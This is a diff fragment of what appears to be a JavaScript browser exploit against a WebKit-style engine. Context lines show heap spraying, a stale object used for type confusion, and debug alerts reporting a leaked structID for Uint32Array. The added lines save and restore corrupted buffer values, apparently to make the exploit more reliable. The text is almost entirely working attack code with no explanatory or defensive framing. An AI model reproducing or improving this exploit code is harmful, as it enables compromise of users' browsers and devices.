@@ -101,6 +101,8 @@ for (var i = 0; i < 0x1000; i++){
 	return 0;
  }
 
+
+
  function go_() {
  	if (smsh.length != 0x10) {
  		smashed();
@@ -167,6 +169,9 @@ for (var i = 0; i < 0x1000; i++){
 				
                        		
 				//alert("Pushed stale");
+				var original_val = bufs[i][k];
+				var original_val1 = bufs[i][k+1];
+				
 				bufs.push(stale);
 				stale[0] = fc;
                         	fcp = bufs[i][k];
@@ -218,6 +223,8 @@ for (var i = 0; i < 0x1000; i++){
 				}
 				alert('found structID for Uint32Array = '+structID);
 				alert('stale[0] is now: '+stale[0]);
+				bufs[i][k] = original_val;
+				bufs[i][k+1] = original_val1;
 				
 				sleep(2000);
 				alert("busywaited for 5 seconds");
